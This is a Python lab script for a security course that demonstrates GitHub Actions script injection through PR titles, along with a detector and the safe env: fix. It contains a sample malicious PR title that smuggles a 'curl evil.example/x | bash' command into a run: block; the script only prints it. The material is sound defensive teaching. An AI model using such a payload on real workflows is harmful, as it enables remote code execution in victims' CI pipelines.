"""
Lab 18: Security
=============================================================
Chapter 18 companion script.

Demonstrates GitHub Actions script injection -- untrusted context fields
(a PR title, an issue body) interpolated directly into a `run:` block are
substituted as raw TEXT before the shell ever runs, so attacker-controlled text
can break out of the intended command. Shows the unsafe pattern, the safe `env:`
indirection fix, and a detector that flags direct interpolation of untrusted
fields in a workflow step.

Usage
-----
Run directly for a demo walkthrough::

    python labs/lab_18_security.py

Environment Variables (PRA_ prefix)
------------------------------------
PRA_OUTPUT_DIR : Path where output reports are written (default: output/)

References
----------
Chapter 18 — Security
"""

from __future__ import annotations

import os
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pr_automerge.render import section  # noqa: E402

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

OUTPUT_DIR: Path = Path(os.getenv("PRA_OUTPUT_DIR", "output"))

#: Context fields an untrusted PR/issue author fully controls -- directly
#: interpolating any of these into a `run:` block is the script-injection footgun
#: (Chapter 18 §5). Not exhaustive; representative of this repo's own surface.
UNTRUSTED_CONTEXT_FIELDS: list[str] = [
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.head_ref",
]

#: A malicious PR title an attacker fully controls -- used to show what direct
#: interpolation would literally substitute into a run: block, WITHOUT ever
#: executing it (this lab only builds and inspects strings, never runs a shell).
MALICIOUS_TITLE: str = 'fix: typo"; curl evil.example/x | bash #'


# ---------------------------------------------------------------------------
# Helper Functions
# ---------------------------------------------------------------------------


def find_direct_interpolation(run_block: str) -> list[str]:
    """Find any untrusted context fields interpolated directly into a `run:` block.

    Parameters
    ----------
    run_block : str
        The text of a step's `run:` value.

    Returns
    -------
    list[str]
        Every untrusted field found interpolated directly (as `${{ field }}`),
        empty if none are.
    """
    found = []
    for field in UNTRUSTED_CONTEXT_FIELDS:
        pattern = r"\$\{\{\s*" + re.escape(field) + r"\s*\}\}"
        if re.search(pattern, run_block):
            found.append(field)
    return found


def simulate_unsafe_substitution(run_template: str, attacker_value: str) -> str:
    """Show literally what GitHub substitutes BEFORE the shell ever runs.

    GitHub's expression engine performs `${{ }}` substitution as plain TEXT
    replacement, at the workflow-file level, before the runner's shell sees
    anything -- this function reproduces exactly that substitution step (never
    executing the result) so the injection is visible as a string, not an
    abstraction.

    Parameters
    ----------
    run_template : str
        A `run:` block containing a literal `${{ github.event.pull_request.title }}`
        placeholder.
    attacker_value : str
        The attacker-controlled value that field would hold.

    Returns
    -------
    str
        The substituted shell command an attacker could produce -- inspect it,
        never execute it.
    """
    return run_template.replace(
        "${{ github.event.pull_request.title }}", attacker_value
    )


def safe_env_indirection(run_template: str) -> str:
    """Show the fix: pass untrusted values through `env:`, never direct interpolation.

    Parameters
    ----------
    run_template : str
        An unsafe `run:` block directly interpolating a title.

    Returns
    -------
    str
        The safe rewrite: the title flows through an `env:` variable, and the
        shell references it as `"$PR_TITLE"` (quoted), which the shell treats as
        DATA, never as command syntax to parse.
    """
    return (
        "env:\n"
        "  PR_TITLE: ${{ github.event.pull_request.title }}\n"
        "run: |\n"
        '  echo "Processing: $PR_TITLE"'
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> None:
    """Demonstrate the unsafe pattern, the literal injection, and the safe fix."""
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    unsafe_run = 'run: echo "Processing: ${{ github.event.pull_request.title }}"'

    section("Detecting direct interpolation of untrusted fields")
    found = find_direct_interpolation(unsafe_run)
    print(f"  run block: {unsafe_run}")
    print(f"  untrusted fields interpolated directly: {found}")

    section("What GitHub literally substitutes before the shell runs")
    substituted = simulate_unsafe_substitution(unsafe_run, MALICIOUS_TITLE)
    print(f"  attacker-controlled PR title: {MALICIOUS_TITLE!r}")
    print(f"  substituted command: {substituted}")
    print("  (never executed -- this line alone shows the shell would see an")
    print("   injected `curl ... | bash` after the closing double-quote)")

    section("The safe fix: env: indirection")
    print(safe_env_indirection(unsafe_run))
    print("\n  The shell sees $PR_TITLE as ONE quoted argument -- attacker text stays data.")

    section("Confirming the safe version has no direct interpolation in run:")
    safe_run_only = 'run: |\n  echo "Processing: $PR_TITLE"'
    found_safe = find_direct_interpolation(safe_run_only)
    print(f"  untrusted fields interpolated directly in the fixed run: block: {found_safe}")


if __name__ == "__main__":
    main()
